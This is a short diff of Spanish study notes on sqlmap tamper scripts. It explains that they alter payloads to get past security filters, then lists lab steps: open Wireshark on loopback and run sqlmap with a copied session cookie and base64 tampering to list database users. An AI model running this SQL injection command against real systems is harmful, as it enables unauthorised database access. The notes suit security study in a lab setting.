@@ -1,2 +1,12 @@
 ++ Se tratan de scipts en python que modifican el payload antes
 de ser enviado al target con la intención de pasar parámetros de seguridad
+
+++ Terminal
+--- sqlmap --list-tampers
+--- wireshark 
+----- Se abrirá la interfaz de wireshark
+----- Seleccionar interfaz loopback:lo
+--- sqlmap -u <url_copiada> --cookie='PHPSESSID=<valor_copiado>; 
+security=low' --tamper=base64encode --batch --users
+---- Enter
+---- Se mostrarán los resultados asociados
